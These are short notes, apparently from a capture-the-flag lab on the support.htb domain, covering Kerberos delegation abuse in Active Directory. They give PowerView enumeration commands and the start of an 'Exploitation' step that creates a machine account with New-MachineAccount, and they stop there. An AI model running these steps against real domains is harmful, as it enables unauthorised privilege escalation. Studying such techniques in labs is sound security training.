# Kerberos Constrained Delegation
get powerview.ps1 on the machine. We can check if users are allowed to create a new computer object on the domain.

```text-plain
Get-DomainObject -Identity "dc=support,dc=htb" -Domain support.htb
```

Finally, we have to check if the target does not have the attribute `msds-allowedtoactonbehalfofotheridentity` set.

```text-plain
hostname
Get-NetComputer dc | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
```

Exploitation:

```text-plain
New-MachineAccount -MachineAccount someuser -Password $(ConvertTo-SecureString 'password123' -AsPlainText -Force) -Verbose
Get-DomainComputer someuser -Properties objectsid
```